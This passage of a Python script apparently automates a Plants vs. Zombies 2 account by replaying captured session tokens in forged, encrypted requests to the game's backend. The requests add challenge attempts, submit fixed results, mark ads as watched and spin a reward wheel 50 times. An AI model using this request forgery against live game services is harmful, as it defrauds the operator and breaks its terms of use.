            run_category(key)

tw_url='https://pvz2.ditwan.cn/backend/api/latest_version/get_latest_version'

版本号="9.9.8"
渠道="com.popcap.pvz2cthdbk"
if os.name == 'posix':
    file_path = "/storage/emulated/0/请求文本.txt"
else:
    file_path = os.path.join(os.path.expanduser("~"), "Desktop", "请求文本.txt")

植物1=""
植物2=""
装扮1=""
装扮2=""
植物 = {
"\033[38;5;214m仙人掌\033[0m": "111129",
"\033[38;5;135m猕猴桃\033[0m": "111116",
"\033[38;5;135m胆小菇\033[0m": "22001570",
"\033[38;5;135m吹风荚兰\033[0m": "111169",
"\033[38;5;135m蚕豆突击队\033[0m": "1193",
"\033[38;5;135m椰子加农炮\033[0m": "1123",
"\033[38;5;135m烈焰菇\033[0m": "1159",
"\033[38;5;135m蒲公英\033[0m": "1161",
"\033[38;5;33m激光豆\033[0m": "1139",
"\033[38;5;33m双胞向日葵\033[0m": "1108",
"\033[38;5;33m原始向日葵\033[0m": "111138",
"\033[38;5;33m魔音甜菜\033[0m": "111123",
"\033[38;5;33m龙舌兰\033[0m": "111115",
"\033[38;5;33m双重射手\033[0m": "1127",
"\033[38;5;33m南瓜巫师\033[0m": "111104",
"\033[38;5;33m窝 瓜\033[0m": "1114",
"\033[38;5;33m潜伏芹菜\033[0m": "111125",
"\033[38;5;33m星星果\033[0m": "1140",
"\033[38;5;33m橡木弓手\033[0m": "1160",
"\033[38;5;33m辣椒投手\033[0m": "1180",
"\033[38;5;33m火龙果\033[0m": "111118",
"\033[38;5;33m孢子菇\033[0m": "111126",
"\033[38;5;33m棉小雪\033[0m": "111113",
"\033[38;5;33m莲小蓬\033[0m": "1175",
"\033[38;5;33m鳄梨\033[0m": "1168",
"\033[38;5;46m火炬树桩\033[0m": "1120",
"\033[38;5;46m三重射手\033[0m": "1130",
"\033[38;5;46m复活萝卜\033[0m": "111128",
"\033[38;5;46m棱镜草\033[0m": "1137",
"\033[38;5;46m树脂投手\033[0m": "1176",
"\033[38;5;46m寒冰射手\033[0m": "1119",
"\033[38;5;46m竹小弟\033[0m": "1188",
"\033[38;5;46m旋风橡果\033[0m": "1185",
"\033[38;5;46m回旋镖射手\033[0m": "1107",
"\033[38;5;46m闪电芦苇\033[0m": "1122",
"\033[38;5;46m西瓜投手\033[0m": "1124",
"\033[38;5;46m钢地刺\033[0m": "1128",
"\033[38;5;46m高坚果\033[0m": "1129",
"\033[38;5;46m机枪石榴\033[0m": "1163",
"\033[38;5;46m旋转菠萝\033[0m": "1195",
"\033[38;5;46m眩晕洋葱\033[0m": "1182",
"\033[38;5;46m大王花\033[0m": "1184",
"\033[38;5;46m飞碟瓜\033[0m": "1192",
"\033[38;5;46m爆炸坚果\033[0m": "111153",
"\033[38;5;46m漩涡枇杷\033[0m": "1189",
"\033[38;5;46m香水蘑菇\033[0m": "111137",
"竹笋": "1136",
"小喷菇": "1149",
"向日葵": "1102",
"豌豆荚": "1125",
"地刺": "1111",
"豌豆射手": "1101",
"坚果": "1103",
"土豆地雷": "1104",
"卷心菜投手": "1105",
"冰冻生菜": "1106",
"白萝卜": "1135",
"氧气藻": "22001380",
"滴水冰莲": "22000170",
"大丽菊": "111110",
}
装扮 = {
"\033[38;5;135m蚕豆装扮\033[0m": "1393",
"\033[38;5;135m椰子炮装扮\033[0m": "1323",
"\033[38;5;135m烈焰菇装扮\033[0m": "1359",
"\033[38;5;135m蒲公英装扮\033[0m": "1361",
"\033[38;5;33m南瓜巫装扮\033[0m": "111304",
"\033[38;5;33m魔音装扮\033[0m": "111323",
"\033[38;5;33m窝瓜装扮\033[0m": "1314",
"\033[38;5;33m芹菜装扮\033[0m": "111325",
"\033[38;5;33m双葵装扮\033[0m": "1308",
"\033[38;5;33m星星果装扮\033[0m": "1340",
"\033[38;5;33m橡木弓装扮\033[0m": "1360",
"\033[38;5;33m辣椒投装扮\033[0m": "1380",
"\033[38;5;33m火龙果装扮\033[0m": "111318",
"\033[38;5;33m原葵装扮\033[0m": "111338",
"\033[38;5;33m孢子菇装扮\033[0m": "111326",
"\033[38;5;33m棉小雪装扮\033[0m": "111313",
"\033[38;5;33m莲小蓬装扮\033[0m": "1375",
"\033[38;5;33m鳄梨装扮\033[0m": "1368",
"\033[38;5;33m双发装扮\033[0m": "1327",
"\033[38;5;46m寒冰装扮\033[0m": "1319",
"\033[38;5;46m竹小弟装扮\033[0m": "1388",
"\033[38;5;46m复活萝装扮\033[0m": "111328",
"\033[38;5;46m棱镜草装扮\033[0m": "1337",
"\033[38;5;46m橡果装扮\033[0m": "1385",
"\033[38;5;46m树脂装扮\033[0m": "1376",
"\033[38;5;46m回旋镖装扮\033[0m": "1307",
"\033[38;5;46m火炬装扮\033[0m": "1320",
"\033[38;5;46m芦苇装扮\033[0m": "1322",
"\033[38;5;46m西瓜装扮\033[0m": "1324",
"\033[38;5;46m钢地刺装扮\033[0m": "1328",
"\033[38;5;46m高坚果装扮\033[0m": "1329",
"\033[38;5;46m三发装扮\033[0m": "1330",
"\033[38;5;46m菠萝装扮\033[0m": "1395",
"\033[38;5;46m洋葱装扮\033[0m": "1382",
"\033[38;5;46m大王花装扮\033[0m": "1384",
"\033[38;5;46m飞碟瓜装扮\033[0m": "1392",
"小豌豆装扮": "1301",
"坚果装扮": "1303",
"土豆雷装扮": "1304",
"卷心菜装扮": "1305",
"冰冻菜装扮": "1306",
"枇杷装扮": "1389",
"香水菇装扮": "111337",
"白萝卜装扮": "1335",
"小喷菇装扮": "1349",
"大丽菊装扮": "111310",
"地刺装扮": "1311",
"向日葵装扮": "1302",
"豌豆荚装扮": "1325",
"竹笋装扮": "1336",
"\033[38;5;214m仙人掌\033[0m": "111129",
"\033[38;5;135m猕猴桃\033[0m": "111116",
"\033[38;5;135m胆小菇\033[0m": "22001570",
"\033[38;5;135m吹风荚兰\033[0m": "111169",
"\033[38;5;135m蚕豆突击队\033[0m": "1193",
"\033[38;5;135m椰子加农炮\033[0m": "1123",
"\033[38;5;135m烈焰菇\033[0m": "1159",
"\033[38;5;135m蒲公英\033[0m": "1161",
"\033[38;5;33m激光豆\033[0m": "1139",
"\033[38;5;33m双胞向日葵\033[0m": "1108",
"\033[38;5;33m原始向日葵\033[0m": "111138",
"\033[38;5;33m魔音甜菜\033[0m": "111123",
"\033[38;5;33m龙舌兰\033[0m": "111115",
"\033[38;5;33m双重射手\033[0m": "1127",
"\033[38;5;33m南瓜巫师\033[0m": "111104",
"\033[38;5;33m窝 瓜\033[0m": "1114",
"\033[38;5;33m潜伏芹菜\033[0m": "111125",
"\033[38;5;33m星星果\033[0m": "1140",
"\033[38;5;33m橡木弓手\033[0m": "1160",
"\033[38;5;33m辣椒投手\033[0m": "1180",
"\033[38;5;33m火龙果\033[0m": "111118",
"\033[38;5;33m孢子菇\033[0m": "111126",
"\033[38;5;33m棉小雪\033[0m": "111113",
"\033[38;5;33m莲小蓬\033[0m": "1175",
"\033[38;5;33m鳄梨\033[0m": "1168",
"\033[38;5;46m火炬树桩\033[0m": "1120",
"\033[38;5;46m三重射手\033[0m": "1130",
"\033[38;5;46m复活萝卜\033[0m": "111128",
"\033[38;5;46m棱镜草\033[0m": "1137",
"\033[38;5;46m树脂投手\033[0m": "1176",
"\033[38;5;46m寒冰射手\033[0m": "1119",
"\033[38;5;46m竹小弟\033[0m": "1188",
"\033[38;5;46m旋风橡果\033[0m": "1185",
"\033[38;5;46m回旋镖射手\033[0m": "1107",
"\033[38;5;46m闪电芦苇\033[0m": "1122",
"\033[38;5;46m西瓜投手\033[0m": "1124",
"\033[38;5;46m钢地刺\033[0m": "1128",
"\033[38;5;46m高坚果\033[0m": "1129",
"\033[38;5;46m机枪石榴\033[0m": "1163",
"\033[38;5;46m旋转菠萝\033[0m": "1195",
"\033[38;5;46m眩晕洋葱\033[0m": "1182",
"\033[38;5;46m大王花\033[0m": "1184",
"\033[38;5;46m飞碟瓜\033[0m": "1192",
"\033[38;5;46m爆炸坚果\033[0m": "111153",
"\033[38;5;46m漩涡枇杷\033[0m": "1189",
"\033[38;5;46m香水蘑菇\033[0m": "111137",
"竹笋": "1136",
"小喷菇": "1149",
"向日葵": "1102",
"豌豆荚": "1125",
"地刺": "1111",
"豌豆射手": "1101",
"坚果": "1103",
"土豆地雷": "1104",
"卷心菜投手": "1105",
"冰冻生菜": "1106",
"白萝卜": "1135",
"氧气藻": "22001380",
"滴水冰莲": "22000170",
"大丽菊": "111110",
}
pinzhi_to_color = {'chengse': 'orange','zise': 'purple','lanse': 'blue','lvse': 'green','baise': 'white','default': 'gray'}
def get_display_width(text):
    clean_text = re.sub(r'\033\[[0-9;]*[a-zA-Z]', '', text)
    width = 0
    for char in clean_text:
        if '\u4e00' <= char <= '\u9fff':
            width += 2
        else:
            width += 1
    return width
def pad_to_width(text, target_width):
    current_width = get_display_width(text)
    if current_width >= target_width:
        return text
    return text + ' ' * (target_width - current_width)
def print_in_columns(items, num_columns=3, column_spacing=1):
    if not items:
        print("(无数据)")
        return
    col_items = [items[i::num_columns] for i in range(num_columns)]
    col_widths = [
        max(get_display_width(item) for item in col) if col else 0
        for col in col_items
    ]
    max_rows = max(len(col) for col in col_items)
    for row_idx in range(max_rows):
        line_parts = []
        for col_idx in range(num_columns):
            if row_idx < len(col_items[col_idx]):
                item = col_items[col_idx][row_idx]
                padded_item = pad_to_width(item, col_widths[col_idx])
                line_parts.append(padded_item)
            else:
                line_parts.append(' ' * col_widths[col_idx])
        print((' ' * column_spacing).join(line_parts))
class 颜色:
    重置 = "\033[0m"
    红色 = "\033[31m"
    绿色 = "\033[32m"
    黄色 = "\033[33m"
    蓝色 = "\033[34m"
    紫色 = "\033[35m"
    青色 = "\033[36m"
    白色 = "\033[37m"
def get_pi_sk(data):
    ui = data.get('v202_data', {}).get('d', {}).get('ui')
    sk = data.get('v202_data', {}).get('d', {}).get('sk')
    pi = data.get('v202_data', {}).get('d', {}).get('pi')
    ek = data.get('ek')
    if pi == None:
        pi = ui
    return pi, ui, sk
def tuoz():
    pi, ui, sk = get_pi_sk(加密)
    suipiantiaozhan()
    print(f"{颜色.绿色}\n请选择植物挑战的植物序号：{颜色.重置}")
    每行数量 = 3
    植物列表 = list(植物.items())
    for idx, (key, value) in enumerate(植物列表):
        print(f"{idx}. {key}", end="\t")
        if (idx + 1) % 每行数量 == 0 or idx == len(植物列表) - 1:
            print()
    choice1 = input(f"{颜色.绿色}请输入植物1的序号（例如 0 表示仙人掌，回车自动选未满阶）：{颜色.重置}").strip()
    if choice1 == "":
        level_dict = get_plant_levels()
        植物列表临时 = list(植物.items())
        selected_idx = None
        for idx, (name, item_id) in enumerate(植物列表临时):
            current_level = level_dict.get(str(item_id), 0)
            max_jieshu = get_max_jieshu(item_id)
            if current_level < max_jieshu:
                selected_idx = idx
                break
        if selected_idx is not None:
            choice1 = str(selected_idx)
            植物1 = list(植物.values())[selected_idx]
            max_j = get_max_jieshu(植物列表临时[selected_idx][1])
            print("自动选择未满阶植物1: " + 植物列表临时[selected_idx][0] + " (当前" + str(level_dict.get(str(植物列表临时[selected_idx][1]),0)+1) + "阶/满" + str(max_j+1) + "阶)")
        else:
            print("所有植物已满阶，默认刷取仙人掌。")
            植物列表临时2 = list(植物.items())
            xrz_idx = 0
            for idx, (name, item_id) in enumerate(植物列表临时2):
                if "仙人掌" in name:
                    xrz_idx = idx
                    break
            植物1 = list(植物.values())[xrz_idx]
            choice1 = str(xrz_idx)
        植物1 = list(植物.values())[int(choice1)]
    else:
        print("无效选择，默认使用第一个植物。")
        植物1 = list(植物.values())[0]
    if pingtai == '安卓':
        choice2 = input(f"{颜色.绿色}请输入植物2的索引编号（例如 1 表示猕猴桃，回车自动选未满阶）：{颜色.重置}").strip()
        if choice2 == "":
            level_dict = get_plant_levels()
            植物列表临时 = list(植物.items())
            selected_idx = None
            count = 0
            for idx, (name, item_id) in enumerate(植物列表临时):
                current_level = level_dict.get(str(item_id), 0)
                max_jieshu = get_max_jieshu(item_id)
                if current_level < max_jieshu:
                    count += 1
                    if count == 2:
                        selected_idx = idx
                        break
            if selected_idx is None:

                for idx, (name, item_id) in enumerate(植物列表临时):
                    current_level = level_dict.get(str(item_id), 0)
                    max_jieshu = get_max_jieshu(item_id)
                    if current_level < max_jieshu:
                        selected_idx = idx
                        break
            if selected_idx is not None:
                choice2 = str(selected_idx)
                植物2 = list(植物.values())[selected_idx]
                max_j2 = get_max_jieshu(植物列表临时[selected_idx][1])
                print("自动选择未满阶植物2: " + 植物列表临时[selected_idx][0] + " (当前" + str(level_dict.get(str(植物列表临时[selected_idx][1]),0)+1) + "阶/满" + str(max_j2+1) + "阶)")
            else:
                print(f"{颜色.红色}所有植物已满阶，默认刷取猕猴桃。{颜色.重置}")
                植物列表临时3 = list(植物.items())
                mht_idx = 1
                for idx, (name, item_id) in enumerate(植物列表临时3):
                    if "猕猴桃" in name:
                        mht_idx = idx
                        break
                植物2 = list(植物.values())[mht_idx]
                choice2 = str(mht_idx)
            植物2 = list(植物.values())[int(choice2)]
        else:
            print(f"{颜色.红色}无效选择，默认使用第二个植物。{颜色.重置}")
            植物2 = list(植物.values())[1]
    print(f"{颜色.绿色}\n请选择装扮挑战的植物编号：{颜色.重置}")
    每行数量 = 3
    装扮列表 = list(装扮.items())
    for idx, (key, value) in enumerate(装扮列表):
        print(f"{idx}. {key}", end="\t")
        if (idx + 1) % 每行数量 == 0 or idx == len(装扮列表) - 1:
            print()
    choice3 = input(f"{颜色.绿色}请输入装扮1的索引编号（例如 0 表示第一个，回车自动选未获得）：{颜色.重置}").strip()
    if choice3 == "":
        unlocked = get_unlocked_zhuangban()
        装扮列表临时 = list(装扮.items())
        selected_idx = None
        for idx, (name, item_id) in enumerate(装扮列表临时):
            if is_zhuangban_id(item_id) and str(item_id) not in unlocked:
                selected_idx = idx
                break
        if selected_idx is not None:
            choice3 = str(selected_idx)
            装扮1 = list(装扮.values())[selected_idx]
            print("自动选择未获得装扮1: " + 装扮列表临时[selected_idx][0])
        else:

            xianrenzhang_idx = None
            for idx, (name, item_id) in enumerate(装扮列表临时):
                if str(item_id) == "111129":
                    xianrenzhang_idx = idx
                    break
            if xianrenzhang_idx is not None:
                choice3 = str(xianrenzhang_idx)
                装扮1 = list(装扮.values())[xianrenzhang_idx]
                print("所有装扮已获得，自动选仙人掌刷碎片: " + 装扮列表临时[xianrenzhang_idx][0])
            else:
                print(f"{颜色.红色}所有装扮已获得，默认使用第一个装扮。{颜色.重置}")
                装扮1 = list(装扮.values())[0]
    elif choice3.isdigit() and 0 <= int(choice3) < len(装扮):
        装扮1 = list(装扮.values())[int(choice3)]
    else:
        print(f"{颜色.红色}无效选择，默认使用第一个装扮。{颜色.重置}")
        装扮1 = list(装扮.values())[0]
    if pingtai == '安卓':
        choice4 = input(f"{颜色.绿色}请输入装扮2的索引编号（例如 1 表示第二个，回车自动选未获得）：{颜色.重置}").strip()
        if choice4 == "":
            unlocked = get_unlocked_zhuangban()
            装扮列表临时 = list(装扮.items())
            selected_idx = None
            count = 0
            for idx, (name, item_id) in enumerate(装扮列表临时):
                if is_zhuangban_id(item_id) and str(item_id) not in unlocked:
                    count += 1
                    if count == 2:
                        selected_idx = idx
                        break
            if selected_idx is None:
                for idx, (name, item_id) in enumerate(装扮列表临时):
                    if is_zhuangban_id(item_id) and str(item_id) not in unlocked:
                        selected_idx = idx
                        break
            if selected_idx is not None:
                choice4 = str(selected_idx)
                装扮2 = list(装扮.values())[selected_idx]
                print("自动选择未获得装扮2: " + 装扮列表临时[selected_idx][0])
            else:

                miuhoutao_idx = None
                for idx, (name, item_id) in enumerate(装扮列表临时):
                    if str(item_id) == "111116":
                        miuhoutao_idx = idx
                        break
                if miuhoutao_idx is not None:
                    choice4 = str(miuhoutao_idx)
                    装扮2 = list(装扮.values())[miuhoutao_idx]
                    print("所有装扮已获得，自动选猕猴桃刷碎片: " + 装扮列表临时[miuhoutao_idx][0])
                else:
                    print(f"{颜色.红色}所有装扮已获得，默认使用第一个装扮。{颜色.重置}")
                    装扮2 = list(装扮.values())[0]
        elif choice4.isdigit() and 0 <= int(choice4) < len(装扮):
            装扮2 = list(装扮.values())[int(choice4)]
        else:
            print(f"{颜色.红色}无效选择，默认使用第一个装扮。{颜色.重置}")
            装扮2 = list(装扮.values())[0]
        print(f"\n当前选择：\n植物1: {植物1}  植物2: {植物2}\n装扮1: {装扮1}  装扮2: {装扮2}")

    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10608,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("碎片挑战刷新成功")
    else:
        print("碎片挑战刷新失败")
    current_weekday = datetime.now().weekday()
    wk_value = 0 if current_weekday == 6 else current_weekday + 1
    if wk_value in [1, 3]:
        data = {"req": "V790", "e": {"pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("巨人危机加次数成功")
        else:
            print("巨人危机加次数失败")
        data = {"req": "V798", "e": {"i": "10502", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("巨人危机加次数成功")
        else:
            print("巨人危机加次数失败")
        data = {"req": "V299", "e": {"a": "2", "ad": "1", "ii": "10502", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("巨人危机加次数成功")
        else:
            print("巨人危机加次数失败")
        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10502", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10502", "ol": {植物1: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("巨人危机挑战成功")
            else:
                print("巨人危机挑战失败")
                break
        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "1", "ii": "10502", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "1", "ii": "10502", "ol": {植物1: 10,}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("巨人危机挑战成功")
            else:
                print("巨人危机挑战失败")
                break
    elif wk_value in [2, 4]:
        data =  {"req": "V790", "e": {"pi": pi, "sk": sk, "t": "2", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("邪恶入侵加次数成功")
        else:
            print("邪恶入侵加次数失败")
        data ={"req": "V798", "e": {"i": "10503", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("邪恶入侵加次数成功")
        else:
            print("邪恶入侵加次数失败")
        data = {"req": "V299", "e": {"a": "2", "ad": "1", "ii": "10503", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("邪恶入侵加次数成功")
        else:
            print("邪恶入侵加次数失败")
        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10503", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10503", "ol": {植物1: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("邪恶入侵挑战成功")
            else:
                print("邪恶入侵挑战失败")
                break
        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "1", "ii": "10503", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "1", "ii": "10503", "ol": {植物1: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("邪恶入侵挑战成功")
            else:
                print("邪恶入侵挑战失败")
                break
    elif wk_value in [5, 6, 0]:
        data = {"req": "V790", "e": {"pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("巨人危机加次数成功")
        else:
            print("巨人危机加次数失败")
        data = {"req": "V798", "e": {"i": "10502", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("巨人危机加次数成功")
        else:
            print("巨人危机加次数失败")
        data = {"req": "V299", "e": {"a": "2", "ad": "1", "ii": "10502", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("巨人危机加次数成功")
        else:
            print("巨人危机加次数失败")
        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10502", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10502", "ol": {植物1: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("巨人危机挑战成功")
            else:
                print("巨人危机挑战失败")
                break
        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "1", "ii": "10502", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "1", "ii": "10502", "ol": {植物1: 10,}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("巨人危机挑战成功")
            else:
                print("巨人危机挑战失败")
                break
        data =  {"req": "V790", "e": {"pi": pi, "sk": sk, "t": "2", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("邪恶入侵加次数成功")
        else:
            print("邪恶入侵加次数失败")
        data ={"req": "V798", "e": {"i": "10503", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("邪恶入侵加次数成功")
        else:
            print("邪恶入侵加次数失败")
        data = {"req": "V299", "e": {"a": "2", "ad": "1", "ii": "10503", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("邪恶入侵加次数成功")
        else:
            print("邪恶入侵加次数失败")

        for i in range(3):
            if pingtai == '安卓':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10503", "ol": {植物1: 10, 植物2: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            elif pingtai == 'ios':
                data = {"req": "V299", "e": {"a": "1", "ad": "0", "ii": "10503", "ol": {植物1: 10}, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("邪恶入侵挑战成功")
            else:
                print("邪恶入侵挑战失败")
                break
    if pingtai == '安卓':
        data ={"req":"V798","e":{"i":"10501","pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("装扮挑战加次数成功")
        else:
            print("装扮挑战加次数失败")
    elif pingtai == 'ios':
        pass
    data ={"req":"V299","e":{"a":"2","ad":"1","ii":"10501","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("装扮挑战加次数成功")
    else:
        print("装扮挑战加次数失败")
    if pingtai == '安卓':
        for i in range(3):
            data = {"req":"V299","e":{"a":"1","ad":"0","ii":"10501","ol":{装扮1:10,装扮2:10},"pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("装扮挑战成功")
            else:
                print("装扮挑战失败")
                break
    elif pingtai == 'ios':
        for i in range(2):
            data = {"req":"V299","e":{"a":"1","ad":"0","ii":"10501","ol":{装扮1:10},"pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("装扮挑战成功")
            else:
                print("装扮挑战失败")
                break
    data = {"req":"V303","e":{"al":[{"id":10615,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("转盘状态更新成功")
        for i in range(50):
            data ={"req": "V940", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            time.sleep(0.25)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("转盘成功")
            else:
                print("转盘失败")
                break
    else:
        print("转盘状态更新失败")
def generate_random_numbers():
    def get_valid_input(prompt, min_limit=None, max_limit=None):
        while True:
            try:
                value = int(input(prompt))
                if (min_limit is not None and value < min_limit):
